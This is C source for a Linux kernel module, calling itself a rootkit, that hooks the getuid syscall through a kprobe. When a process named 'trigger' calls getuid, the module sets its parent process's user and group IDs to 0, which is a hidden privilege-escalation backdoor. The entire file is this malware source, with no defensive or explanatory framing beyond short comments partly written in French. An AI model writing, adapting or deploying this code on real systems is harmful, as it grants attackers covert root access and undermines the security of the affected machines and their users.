#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>
#include <linux/kprobes.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Victor");
MODULE_DESCRIPTION("Hook getuid syscall to give root privileges using Kprobes");
MODULE_VERSION("0.01");

static struct kprobe kp;
static void set_root(void);

static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    const char *target_cmd = "trigger";  // Nom de la commande a trigger pour activer la privesc
    char comm[TASK_COMM_LEN]; // Nom du processus actuel

    // Récupérer le nom du processus actuel
    get_task_comm(comm, current);

    // Vérifier si la commande correspond à la cible
    if (strcmp(comm, target_cmd) == 0) {
        printk(KERN_INFO "rootkit: Granting root privileges for process %s...\n", comm);
        set_root();
    }

    return 0;
}



static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
{
    // Si le syscall a réussi, on met le registre ax à 0
    if (regs->si == 0) {
        regs->ax = 0;  // Indique succès pour le syscall
    }
}

static void set_root(void)
{
    struct cred *new_creds;
    struct task_struct *parent_task;

    // Get the parent process
    parent_task = current->real_parent;

    // Prepare new credentials
    new_creds = prepare_creds();
    if (new_creds == NULL) {
        printk(KERN_ALERT "rootkit: Unable to prepare credentials.\n");
        return;
    }

    // Set the new credentials to root
    new_creds->uid.val = 0;
    new_creds->gid.val = 0;
    new_creds->euid.val = 0;
    new_creds->egid.val = 0;
    new_creds->suid.val = 0;
    new_creds->sgid.val = 0;
    new_creds->fsuid.val = 0;
    new_creds->fsgid.val = 0;

    // Commit the new credentials to the parent process
    if (parent_task) {
        task_lock(parent_task); // Lock to modify safely
        parent_task->real_cred = new_creds;
        parent_task->cred = new_creds;
        task_unlock(parent_task); // Unlock after modification
    } else {
        printk(KERN_ALERT "rootkit: Parent task not found.\n");
    }

    printk(KERN_INFO "rootkit: Parent process privileges escalated successfully.\n");
}

static int __init rootkit_init(void)
{
    int ret;
    kp.symbol_name = "__x64_sys_getuid";
    kp.pre_handler = handler_pre;
    kp.post_handler = handler_post;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        printk(KERN_ERR "rootkit: Failed to register kprobe, returned %d\n", ret);
        return ret;
    }

    printk(KERN_INFO "rootkit: Kprobe registered at %s\n", kp.symbol_name);
    return 0;
}

static void __exit rootkit_exit(void)
{
    unregister_kprobe(&kp);
    printk(KERN_INFO "rootkit: Kprobe unregistered\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);